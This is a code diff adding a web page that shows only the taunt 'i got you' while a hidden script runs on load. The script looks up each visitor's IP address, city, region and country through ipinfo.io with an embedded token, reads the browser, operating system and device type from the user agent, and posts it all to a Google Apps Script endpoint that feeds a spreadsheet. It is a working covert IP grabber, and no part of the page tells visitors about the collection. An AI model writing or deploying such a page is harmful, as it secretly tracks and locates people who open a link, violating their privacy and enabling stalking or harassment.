@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>i got you</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: monospace;
+      font-size: 4em;
+      text-align: center;
+      padding-top: 20%;
+    }
+  </style>
+</head>
+<body>
+  i got you
+
+  <script>
+    async function getInfo() {
+      try {
+        // Get IP + location data
+        const res = await fetch("https://ipinfo.io/json?token=3b36a05c59d720");
+        const ipData = await res.json();
+
+        // Get browser + device info
+        const ua = navigator.userAgent;
+        const isMobile = /Mobi|Android/i.test(ua);
+        let os = "Unknown OS";
+        if (ua.indexOf("Win") != -1) os = "Windows";
+        else if (ua.indexOf("Mac") != -1) os = "MacOS";
+        else if (ua.indexOf("Linux") != -1) os = "Linux";
+        else if (ua.indexOf("Android") != -1) os = "Android";
+        else if (ua.indexOf("iPhone") != -1) os = "iOS";
+
+        let browser = "Unknown Browser";
+        if (ua.indexOf("Chrome") > -1) browser = "Chrome";
+        else if (ua.indexOf("Safari") > -1) browser = "Safari";
+        else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+        else if (ua.indexOf("Edge") > -1) browser = "Edge";
+        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
+
+        const data = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country,
+          device: isMobile ? "Mobile" : "Desktop",
+          os: os,
+          browser: browser
+        };
+
+        // Send to your Google Sheet
+        await fetch("https://script.google.com/macros/s/AKfycbzydTW3DwCPx9xwAu0bi7hOZE040Si2Ms4gNLFKRxRM156vn9w1VqqlBOJ9PA4h7kTlSQ/exec", {
+          method: "POST",
+          body: JSON.stringify(data),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        });
+
+      } catch (err) {
+        console.error("Error:", err);
+      }
+    }
+
+    getInfo();
+  </script>
+</body>
+</html>
